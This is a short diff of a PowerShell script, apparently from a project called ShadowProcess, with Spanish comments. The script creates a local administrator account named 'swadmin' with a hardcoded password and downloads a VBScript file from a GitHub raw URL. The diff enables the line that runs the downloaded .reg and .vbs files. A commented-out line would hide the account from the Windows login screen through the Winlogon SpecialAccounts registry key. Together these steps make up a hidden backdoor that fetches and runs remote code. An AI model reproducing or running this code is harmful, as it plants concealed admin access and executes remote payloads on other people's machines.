@@ -32,7 +32,7 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
 
-#creando usuario administrador 
+#Creando usuario administrador 
 $NewLocalAdmin = "swadmin"
 $Password = (ConvertTo-SecureString "Melon123$!" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
@@ -50,7 +50,7 @@ $vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #instalando registro
-#powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
+powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
 #powershell powershell.exe -windowstyle hidden Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' | New-Item -Name 'shprocess' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'shprocess' -Value "00000000" -PropertyType DWORD -Force
 
 cd $path
